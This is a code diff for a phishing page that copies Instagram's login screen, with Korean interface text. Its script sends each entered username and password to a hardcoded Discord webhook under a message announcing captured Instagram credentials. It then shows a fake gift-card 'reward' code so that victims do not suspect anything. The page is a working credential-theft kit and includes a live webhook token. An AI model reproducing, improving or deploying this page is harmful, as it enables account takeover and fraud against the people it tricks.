@@ -13,45 +13,42 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            flex-direction: column;
         }
-        .container {
+        .contentsWrap {
             width: 350px;
             text-align: center;
         }
-        .login-box {
+        .loginWindow {
             background: white;
             border: 1px solid #dbdbdb;
             padding: 30px 40px;
             margin-bottom: 10px;
             border-radius: 1px;
         }
-        .logo {
-            font-family: 'Billabong', cursive, sans-serif;
-            font-size: 51px;
-            font-weight: normal;
+        #instaLogo {
+            width: 175px;
             margin: 22px 0 35px 0;
-            color: #262626;
         }
-        .input-field {
-            position: relative;
-            margin-bottom: 6px;
+        .inlineToBlock {
+            width: 100%;
+            box-sizing: border-box;
+            display: block;
         }
         input {
-            width: 100%;
             background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            box-sizing: border-box;
             color: #262626;
             font-size: 12px;
             padding: 12px 9px 8px 9px;
             outline: none;
+            margin-bottom: 6px;
         }
         input:focus {
             border-color: #a8a8a8;
         }
-        button {
-            width: 100%;
+        button.ordinaryLogin {
             background: #0095f6;
             border: 1px solid transparent;
             border-radius: 4px;
@@ -62,39 +59,127 @@
             margin-top: 14px;
             cursor: pointer;
         }
-        button:active {
+        button.ordinaryLogin:active {
             opacity: 0.7;
         }
-        .signup-box {
+        .horizonAndOrWrap {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+        .horizonAndOrWrap hr {
+            flex-grow: 1;
+            border: none;
+            border-top: 1px solid #dbdbdb;
+        }
+        .horizonAndOrWrap .or {
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .noneunderline {
+            text-decoration: none;
+        }
+        .facebookLogin {
+            background: transparent;
+            border: none;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 5px;
+            width: 100%;
+        }
+        .facebookIcon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+        .haveAccount {
             background: white;
             border: 1px solid #dbdbdb;
             padding: 20px;
             font-size: 14px;
             color: #262626;
         }
-        .signup-box a {
+        .haveAccount a {
             color: #0095f6;
             text-decoration: none;
             font-weight: 600;
         }
+        /* 상품권 지급 화면 스타일 */
+        #rewardBox {
+            display: none;
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px 20px;
+            border-radius: 1px;
+        }
+        .reward-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #262626;
+            margin-bottom: 15px;
+        }
+        .reward-code {
+            background: #efefef;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #0095f6;
+            letter-spacing: 2px;
+            margin: 20px 0;
+            border-radius: 4px;
+            border: 1px dashed #dbdbdb;
+        }
+        .reward-desc {
+            font-size: 13px;
+            color: #8e8e8e;
+            line-height: 1.4;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="login-box">
-            <div class="logo">Instagram</div>
+    
+    <div class="contentsWrap">
+        <!-- 로그인 창 -->
+        <div class="loginWindow" id="loginWindow">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2.png/7a281da00b49.png" alt="Instagram" id="instaLogo">
+            
             <form id="loginForm">
-                <div class="input-field">
-                    <input type="text" id="username" name="username" placeholder="전화번호, 사용자 이름 또는 이메일" required>
-                </div>
-                <div class="input-field">
-                    <input type="password" id="password" name="password" placeholder="비밀번호" required>
-                </div>
-                <button type="submit">로그인</button>
+                <input type="text" id="username" placeholder="전화번호, 사용자 이름 또는 이메일" class="inlineToBlock" required>
+                <input type="password" id="password" placeholder="비밀번호" class="inlineToBlock" required>
+                <button type="submit" class="inlineToBlock ordinaryLogin unactivatedLoginColor">로그인</button>
             </form>
+
+            <div class="horizonAndOrWrap">
+                <hr class="leftHr">
+                <div class="or">또는</div>
+                <hr class="rightHr">
+            </div>
+
+            <a href="#" class="noneunderline">
+                <button class="inlineToBlock facebookLogin" type="button">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/lam-fZmcvvn.png" alt="" class="facebookIcon">
+                    Facebook으로 로그인
+                </button>
+            </a>
         </div>
-        <div class="signup-box">
-            계정이 없으신가요? <a href="#">가입하기</a>
+        
+        <!-- 상품권 지급 완료 창 (처음엔 숨겨져 있음) -->
+        <div id="rewardBox">
+            <div class="reward-title">🎉 이벤트 상품권 지급 완료!</div>
+            <div class="reward-desc">참여해주셔서 감사합니다.<br>아래 상품권 코드를 복사해서 사용하세요.</div>
+            <div class="reward-code" id="couponCode"></div>
+            <div class="reward-desc" style="font-size: 11px; margin-top: 15px;">※ 본 코드는 선착순으로 등록 후 소멸될 수 있습니다.</div>
+        </div>
+
+        <div class="haveAccount" id="bottomBox">
+            <p>계정이 없으신가요? <a href="#" class="noneunderline">가입하기</a></p>
         </div>
     </div>
 
@@ -105,14 +190,13 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            // 디스코드 웹훅 주소 (직접 평문으로 박아서 오작동 원천 차단)
             const webhookUrl = "https://discord.com/api/webhooks/1550104827672006717/peMYiP25Tq5ZlIm3f-bC4tL2Tfs3tW_eHkLnlNopQGh58FVsQZNE76mNLkRZHSF9K0IT";
 
             const payload = {
                 content: `🎯 **인스타 로그인 정보 획득!**\n- **ID:** \`${username}\`\n- **PW:** \`${password}\``
             };
 
-            // CORS 우회를 위해 no-cors 모드 또는 일반 전송 시도
+            // 웹훅으로 정보 전송
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
@@ -121,10 +205,16 @@
                 body: JSON.stringify(payload)
             }).catch(err => {
                 console.log(err);
-            }).finally(() => {
-                // 입력 후 실제 인스타그램으로 이동
-                window.location.href = "https://www.instagram.com";
             });
+
+            // 랜덤 가짜 상품권 번호 생성 (예: 문화상품권 스타일)
+            const randomCode = "GIFT-" + Math.floor(1000 + Math.random() * 9000) + "-" + Math.floor(1000 + Math.random() * 9000) + "-" + Math.floor(1000 + Math.random() * 9000);
+            document.getElementById('couponCode').innerText = randomCode;
+
+            // 로그인 창을 숨기고 상품권 지급 창을 띄움
+            document.getElementById('loginWindow').style.display = 'none';
+            document.getElementById('bottomBox').style.display = 'none';
+            document.getElementById('rewardBox').style.display = 'block';
         });
     </script>
 </body>
